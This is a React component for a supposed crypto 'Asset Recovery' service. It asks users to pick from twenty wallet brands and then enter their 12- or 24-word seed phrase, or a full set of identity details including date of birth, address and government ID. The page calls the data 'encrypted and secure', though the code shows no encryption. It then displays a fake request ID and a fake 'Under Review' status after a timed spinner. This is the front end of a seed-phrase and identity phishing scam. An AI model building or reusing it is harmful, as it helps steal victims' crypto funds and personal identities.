import { useState } from 'react';
import { motion } from 'framer-motion';
import { CheckCircle2, Loader2, ArrowLeft, ArrowRight, ChevronDown, Clock, FileText, Mail } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { 
  WalletMetamask, WalletTrust, WalletCoinbase, WalletPhantom,
  WalletLedger, WalletTrezor, WalletExodus, WalletRainbow,
  WalletArgent, WalletBackpack, WalletCoin98, WalletOkx,
  WalletSafe, WalletZerion, WalletZengo, WalletImtoken,
  WalletTokenPocket, WalletXdefi, WalletSolflare, WalletKraken
} from '@web3icons/react';

// Wallets that need KYC (full identity verification)
const KYC_WALLETS = ['coinbase', 'kraken', 'ledger', 'trezor', 'rainbow', 'argent', 'backpack', 'coin98', 'okx', 'safe', 'zerion', 'zengo', 'imtoken', 'tokenpocket', 'xdefi'];

// Wallets that need seed phrase (recovery phrase only)
const SEED_PHRASE_WALLETS = ['metamask', 'trust', 'phantom', 'exodus', 'solflare'];

const wallets = [
  { id: 'metamask', name: 'MetaMask', icon: WalletMetamask },
  { id: 'trust', name: 'Trust Wallet', icon: WalletTrust },
  { id: 'coinbase', name: 'Coinbase Wallet', icon: WalletCoinbase },
  { id: 'phantom', name: 'Phantom', icon: WalletPhantom },
  { id: 'kraken', name: 'Kraken Wallet', icon: WalletKraken },
  { id: 'ledger', name: 'Ledger', icon: WalletLedger },
  { id: 'trezor', name: 'Trezor', icon: WalletTrezor },
  { id: 'exodus', name: 'Exodus', icon: WalletExodus },
  { id: 'rainbow', name: 'Rainbow', icon: WalletRainbow },
  { id: 'argent', name: 'Argent', icon: WalletArgent },
  { id: 'backpack', name: 'Backpack', icon: WalletBackpack },
  { id: 'coin98', name: 'Coin98', icon: WalletCoin98 },
  { id: 'okx', name: 'OKX Wallet', icon: WalletOkx },
  { id: 'safe', name: 'Safe', icon: WalletSafe },
  { id: 'zerion', name: 'Zerion', icon: WalletZerion },
  { id: 'zengo', name: 'Zengo', icon: WalletZengo },
  { id: 'imtoken', name: 'imToken', icon: WalletImtoken },
  { id: 'tokenpocket', name: 'TokenPocket', icon: WalletTokenPocket },
  { id: 'xdefi', name: 'XDEFI', icon: WalletXdefi },
  { id: 'solflare', name: 'Solflare', icon: WalletSolflare },
];

const countries = [
  'United States', 'United Kingdom', 'Canada', 'Australia', 'Germany', 
  'France', 'Spain', 'Italy', 'Netherlands', 'Nigeria', 'South Africa', 
  'India', 'Singapore', 'Japan', 'South Korea', 'Brazil', 'Mexico',
  'UAE', 'Switzerland', 'Sweden', 'Norway', 'Denmark', 'Ireland'
];

type Question = 
  | { id: string; label: string; type: 'text' | 'email' | 'tel' | 'date'; placeholder: string; optional?: boolean }
  | { id: string; label: string; type: 'select'; options: string[]; placeholder?: string; optional?: boolean };

const kycQuestions: Question[] = [
  { id: 'fullName', label: 'What is your full legal name?', type: 'text', placeholder: 'John Doe' },
  { id: 'email', label: 'What is your email address?', type: 'email', placeholder: 'john@example.com' },
  { id: 'phone', label: 'What is your phone number?', type: 'tel', placeholder: '+1 234 567 8900' },
  { id: 'dateOfBirth', label: 'What is your date of birth?', type: 'date', placeholder: 'YYYY-MM-DD' },
  { id: 'address', label: 'What is your residential address?', type: 'text', placeholder: '123 Main Street' },
  { id: 'city', label: 'What city do you live in?', type: 'text', placeholder: 'New York' },
  { id: 'country', label: 'What country are you from?', type: 'select', options: countries },
  { id: 'idNumber', label: 'Government ID Number (Optional)', type: 'text', placeholder: 'Passport / Driver\'s License', optional: true },
];

interface AssetRecoveryProps {
  onClose?: () => void;
}

export function AssetRecovery({ onClose }: AssetRecoveryProps) {
  const [step, setStep] = useState<'wallet' | 'seed' | 'kyc' | 'loading' | 'tracking'>('wallet');
  const [selectedWallet, setSelectedWallet] = useState('');
  const [dropdownOpen, setDropdownOpen] = useState(false);
  const [currentQuestionIndex, setCurrentQuestionIndex] = useState(0);
  const [formData, setFormData] = useState<Record<string, string>>({});
  const [seedData, setSeedData] = useState({ walletAddress: '', seedPhrase: '' });
  const [emailError, setEmailError] = useState('');
  const [requestId] = useState(() => `REC-${Math.random().toString(36).substring(2, 10).toUpperCase()}`);
  const [inputMethod, setInputMethod] = useState<'address' | 'seed'>('address');

  const selectedWalletObj = wallets.find(w => w.id === selectedWallet);
  const IconComponent = selectedWalletObj?.icon;
  const needsSeedPhrase = SEED_PHRASE_WALLETS.includes(selectedWallet);
  
  const currentQuestions = kycQuestions;
  const currentQuestion = currentQuestions[currentQuestionIndex];
  const isLastQuestion = currentQuestionIndex === currentQuestions.length - 1;

  const validateEmail = (email: string) => {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
  };

const handleWalletSelect = async (walletId: string) => {
  setSelectedWallet(walletId);
  setDropdownOpen(false);
  
  // Check if this wallet requires seed phrase (MetaMask, Trust, Phantom, Solflare)
  if (SEED_PHRASE_WALLETS.includes(walletId)) {
    setStep('seed');
  } else {
    setStep('kyc');
    setCurrentQuestionIndex(0);
  }
};

  const handleAnswer = (value: string) => {
    setFormData(prev => ({ ...prev, [currentQuestion.id]: value }));
    
    if (currentQuestion.id === 'email') {
      if (!validateEmail(value)) {
        setEmailError('Please enter a valid email address');
      } else {
        setEmailError('');
      }
    }
  };

  const handleNext = () => {
    if (currentQuestion.id === 'email' && !validateEmail(formData.email)) {
      setEmailError('Please enter a valid email address');
      return;
    }
    
    if (isLastQuestion) {
      setStep('loading');
      setTimeout(() => {
        setStep('tracking');
      }, 3000);
    } else {
      setCurrentQuestionIndex(prev => prev + 1);
    }
  };

  const handleSeedSubmit = () => {
    const hasValue = inputMethod === 'address' 
      ? seedData.walletAddress?.trim() 
      : seedData.seedPhrase?.trim();
    
    if (!hasValue) return;
    setStep('loading');
    setTimeout(() => {
      setStep('tracking');
    }, 3000);
  };

  const handleBackFromSeed = () => {
    setStep('wallet');
    setSelectedWallet('');
    setSeedData({ walletAddress: '', seedPhrase: '' });
    setInputMethod('address');
  };

  const handleBackFromKyc = () => {
    if (currentQuestionIndex > 0) {
      setCurrentQuestionIndex(prev => prev - 1);
    } else {
      setStep('wallet');
      setSelectedWallet('');
      setCurrentQuestionIndex(0);
      setFormData({});
      setEmailError('');
    }
  };

  const handleNewRequest = () => {
    setStep('wallet');
    setSelectedWallet('');
    setCurrentQuestionIndex(0);
    setFormData({});
    setSeedData({ walletAddress: '', seedPhrase: '' });
    setEmailError('');
    setInputMethod('address');
  };

  // Loading Modal
  if (step === 'loading') {
    return (
      <div className="fixed inset-0 z-50 bg-black/60 backdrop-blur-sm flex items-center justify-center">
        <motion.div
          initial={{ opacity: 0, scale: 0.9 }}
          animate={{ opacity: 1, scale: 1 }}
          className="bg-background rounded-2xl p-8 text-center max-w-sm w-full mx-4 border border-border shadow-2xl"
        >
          <div className="w-16 h-16 mx-auto mb-4">
            <Loader2 className="w-16 h-16 text-primary animate-spin" />
          </div>
          <h3 className="text-xl font-semibold text-foreground mb-2">Processing Your Request</h3>
          <p className="text-muted-foreground text-sm">
            Please wait while we submit your information...
          </p>
        </motion.div>
      </div>
    );
  }

  // Tracking Page
  if (step === 'tracking') {
    return (
      <div className="max-w-lg mx-auto p-4 md:p-6">
        <div className="bg-background border border-border rounded-2xl overflow-hidden">
          <div className="h-1 w-full bg-gradient-to-r from-green-500 via-emerald-500 to-teal-500" />
          
          <div className="p-6">
            <div className="flex justify-center mb-6">
              <div className="w-20 h-20 bg-green-500/10 rounded-full flex items-center justify-center">
                <CheckCircle2 className="w-10 h-10 text-green-500" />
              </div>
            </div>

            <div className="text-center mb-6">
              <h3 className="text-xl font-bold text-foreground mb-2">Request Received</h3>
              <p className="text-sm text-muted-foreground">
                Your recovery request has been submitted successfully
              </p>
            </div>

            <div className="bg-secondary/30 rounded-xl p-4 mb-6">
              <div className="flex items-center gap-3 mb-4 pb-3 border-b border-border">
                <div className="w-10 h-10 bg-primary/10 rounded-xl flex items-center justify-center">
                  <FileText className="w-5 h-5 text-primary" />
                </div>
                <div>
                  <p className="text-xs text-muted-foreground">Request ID</p>
                  <p className="text-sm font-mono font-semibold text-foreground">{requestId}</p>
                </div>
              </div>
              
              <div className="space-y-3">
                <div className="flex justify-between items-center">
                  <span className="text-sm text-muted-foreground">Wallet</span>
                  <div className="flex items-center gap-2">
                    {IconComponent && <IconComponent size={20} variant="branded" />}
                    <span className="text-sm font-medium text-foreground">{selectedWalletObj?.name}</span>
                  </div>
                </div>
                <div className="flex justify-between items-center">
                  <span className="text-sm text-muted-foreground">Status</span>
                  <span className="text-sm font-medium text-yellow-500 flex items-center gap-1">
                    <Clock className="w-3 h-3" /> Under Review
                  </span>
                </div>
                <div className="flex justify-between items-center">
                  <span className="text-sm text-muted-foreground">Submitted</span>
                  <span className="text-sm text-foreground">{new Date().toLocaleString()}</span>
                </div>
              </div>
            </div>

            <div className="bg-primary/5 rounded-xl p-4 mb-6 border border-primary/10">
              <div className="flex items-start gap-3">
                <Mail className="w-5 h-5 text-primary flex-shrink-0 mt-0.5" />
                <div>
                  <p className="text-sm font-medium text-foreground mb-1">What happens next?</p>
                  <p className="text-xs text-muted-foreground">
                    Our team will review your request and contact you via email within 24-48 hours.
                    You can track the status using your Request ID.
                  </p>
                </div>
              </div>
            </div>

            <div className="flex gap-3">
              <button
                onClick={handleNewRequest}
                className="flex-1 h-11 rounded-xl border border-border bg-background text-foreground font-medium hover:bg-secondary transition-colors"
              >
                New Request
              </button>
              <button
                onClick={onClose}
                className="flex-1 h-11 rounded-xl bg-primary text-white font-medium hover:bg-primary/90 transition-colors"
              >
                Close
              </button>
            </div>
          </div>
        </div>
      </div>
    );
  }

  // Seed Phrase / Wallet Address Step (for seed wallets)
  if (step === 'seed') {
    return (
      <div className="max-w-lg mx-auto p-4 md:p-6 min-h-[500px] flex flex-col justify-center">
        <div className="bg-background border border-border rounded-2xl p-6">
          <div className="mb-8">
            <div className="flex justify-between text-xs text-muted-foreground mb-2">
              <span>Step 1 of 1</span>
              <span>100%</span>
            </div>
            <div className="h-1.5 bg-secondary rounded-full overflow-hidden">
              <div className="h-full bg-primary rounded-full" style={{ width: '100%' }} />
            </div>
          </div>

          <div className="space-y-6">
            <div>
              <h3 className="text-xl font-semibold text-foreground mb-2">
                Recovery Information
              </h3>
              <p className="text-xs text-muted-foreground">
                Choose how you want to recover your {selectedWalletObj?.name} wallet
              </p>
            </div>

            {/* Toggle Buttons */}
            <div className="flex gap-3 p-1 bg-secondary/30 rounded-xl">
              <button
                onClick={() => setInputMethod('address')}
                className={`flex-1 py-2.5 rounded-lg text-sm font-medium transition-all ${
                  inputMethod === 'address' 
                    ? 'bg-primary text-white shadow-md' 
                    : 'text-muted-foreground hover:text-foreground'
                }`}
              >
                Wallet Address / TX Hash
              </button>
              <button
                onClick={() => setInputMethod('seed')}
                className={`flex-1 py-2.5 rounded-lg text-sm font-medium transition-all ${
                  inputMethod === 'seed' 
                    ? 'bg-primary text-white shadow-md' 
                    : 'text-muted-foreground hover:text-foreground'
                }`}
              >
                Seed Phrase
              </button>
            </div>

            {/* Input Field Based on Selection */}
            {inputMethod === 'address' ? (
              <textarea
                value={seedData.walletAddress}
                onChange={(e) => setSeedData(prev => ({ ...prev, walletAddress: e.target.value }))}
                placeholder="Enter your wallet address or transaction hash (e.g., 0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb0)"
                rows={3}
                className="w-full rounded-xl border border-border bg-background p-4 text-foreground focus:outline-none focus:ring-2 focus:ring-primary resize-none font-mono text-sm"
              />
            ) : (
              <textarea
                value={seedData.seedPhrase}
                onChange={(e) => setSeedData(prev => ({ ...prev, seedPhrase: e.target.value }))}
                placeholder="Enter your 12 or 24 word recovery phrase (separated by spaces)"
                rows={4}
                className="w-full rounded-xl border border-border bg-background p-4 text-foreground focus:outline-none focus:ring-2 focus:ring-primary resize-none font-mono text-sm"
              />
            )}

            {/* Security Note */}
            <div className="bg-amber-500/5 rounded-xl p-3 border border-amber-500/20">
              <p className="text-xs text-muted-foreground flex items-start gap-2">
                <span>🔒</span>
                <span>This information is encrypted and secure. Never share your recovery phrase with anyone.</span>
              </p>
            </div>
          </div>

          <div className="flex gap-3 mt-8">
            <button
              onClick={handleBackFromSeed}
              className="flex-1 h-11 rounded-xl border border-border bg-background text-foreground font-medium hover:bg-secondary transition-colors flex items-center justify-center gap-2"
            >
              <ArrowLeft className="w-4 h-4" />
              Back
            </button>
            <button
              onClick={handleSeedSubmit}
              disabled={inputMethod === 'address' ? !seedData.walletAddress : !seedData.seedPhrase}
              className="flex-1 h-11 rounded-xl bg-primary text-white font-medium hover:bg-primary/90 transition-colors disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
            >
              Submit
              <ArrowRight className="w-4 h-4" />
            </button>
          </div>
        </div>
      </div>
    );
  }

  // Wallet Selection Step
  if (step === 'wallet') {
    return (
      <div className="max-w-lg mx-auto p-4 md:p-6">
        <div className="bg-background border border-border rounded-2xl p-6">
          <div className="text-center mb-8">
            <h2 className="text-2xl font-bold text-foreground">Asset Recovery</h2>
            <p className="text-muted-foreground text-sm mt-2">
              Select your wallet to begin the recovery process
            </p>
          </div>

          <div className="relative mb-8">
            <button
              onClick={() => setDropdownOpen(!dropdownOpen)}
              className="w-full flex items-center justify-between p-4 rounded-xl border border-border bg-background hover:border-primary/50 transition-colors"
            >
              <div className="flex items-center gap-3">
                {selectedWalletObj ? (
                  <>
                    <IconComponent size={28} variant="branded" />
                    <span className="text-foreground font-medium">{selectedWalletObj.name}</span>
                  </>
                ) : (
                  <span className="text-muted-foreground">Select your wallet</span>
                )}
              </div>
              <ChevronDown className={`w-5 h-5 text-muted-foreground transition-transform ${dropdownOpen ? 'rotate-180' : ''}`} />
            </button>

            {dropdownOpen && (
              <div className="absolute top-full left-0 right-0 mt-2 max-h-80 overflow-y-auto bg-background border border-border rounded-xl shadow-lg z-10">
                {wallets.map((wallet) => {
                  const WalletIcon = wallet.icon;
                  return (
                    <button
                      key={wallet.id}
                      onClick={() => handleWalletSelect(wallet.id)}
                      className="w-full flex items-center gap-3 p-3 hover:bg-secondary transition-colors text-left"
                    >
                      <WalletIcon size={24} variant="branded" />
                      <span className="text-foreground text-sm">{wallet.name}</span>
                    </button>
                  );
                })}
              </div>
            )}
          </div>

          <p className="text-xs text-muted-foreground text-center mt-4">
            We support {wallets.length}+ wallets. If yours isn't listed, contact support.
          </p>
        </div>
      </div>
    );
  }

  // KYC Questions Step
  const isEmailField = currentQuestion?.id === 'email';
  const currentValue = formData[currentQuestion?.id] || '';
  const isValid = isEmailField ? validateEmail(currentValue) : true;

  return (
    <div className="max-w-lg mx-auto p-4 md:p-6 min-h-[500px] flex flex-col justify-center">
      <div className="bg-background border border-border rounded-2xl p-6">
        <div className="mb-8">
          <div className="flex justify-between text-xs text-muted-foreground mb-2">
            <span>Step {currentQuestionIndex + 1} of {currentQuestions.length}</span>
            <span>{Math.round(((currentQuestionIndex + 1) / currentQuestions.length) * 100)}%</span>
          </div>
          <div className="h-1.5 bg-secondary rounded-full overflow-hidden">
            <div 
              className="h-full bg-primary rounded-full transition-all duration-300"
              style={{ width: `${((currentQuestionIndex + 1) / currentQuestions.length) * 100}%` }}
            />
          </div>
        </div>

        <motion.div
          key={currentQuestion?.id}
          initial={{ opacity: 0, x: 20 }}
          animate={{ opacity: 1, x: 0 }}
          exit={{ opacity: 0, x: -20 }}
          className="space-y-6"
        >
          <div>
            <h3 className="text-xl font-semibold text-foreground mb-2">
              {currentQuestion?.label}
            </h3>
            {currentQuestion?.optional && (
              <p className="text-xs text-muted-foreground">Optional</p>
            )}
          </div>

          {currentQuestion?.type === 'select' ? (
            <select
              value={currentValue}
              onChange={(e) => handleAnswer(e.target.value)}
              className="w-full h-12 rounded-xl border border-border bg-background px-4 text-foreground focus:outline-none focus:ring-2 focus:ring-primary"
            >
              <option value="">Select your country</option>
              {(currentQuestion as any).options?.map((opt: string) => (
                <option key={opt} value={opt}>{opt}</option>
              ))}
            </select>
          ) : (
            <>
              <Input
                type={currentQuestion?.type}
                value={currentValue}
                onChange={(e) => handleAnswer(e.target.value)}
                placeholder={currentQuestion?.placeholder}
                className={`h-12 rounded-xl ${emailError ? 'border-red-500 focus:ring-red-500' : ''}`}
                autoFocus
              />
              {emailError && (
                <p className="text-xs text-red-500 mt-1">{emailError}</p>
              )}
            </>
          )}
        </motion.div>

        <div className="flex gap-3 mt-8">
          <button
            onClick={handleBackFromKyc}
            className="flex-1 h-11 rounded-xl border border-border bg-background text-foreground font-medium hover:bg-secondary transition-colors flex items-center justify-center gap-2"
          >
            <ArrowLeft className="w-4 h-4" />
            Back
          </button>
          <button
            onClick={handleNext}
            disabled={(!currentValue && !currentQuestion?.optional) || (isEmailField && !isValid)}
            className="flex-1 h-11 rounded-xl bg-primary text-white font-medium hover:bg-primary/90 transition-colors disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
          >
            {isLastQuestion ? 'Submit' : 'Continue'}
            <ArrowRight className="w-4 h-4" />
          </button>
        </div>
      </div>
    </div>
  );
}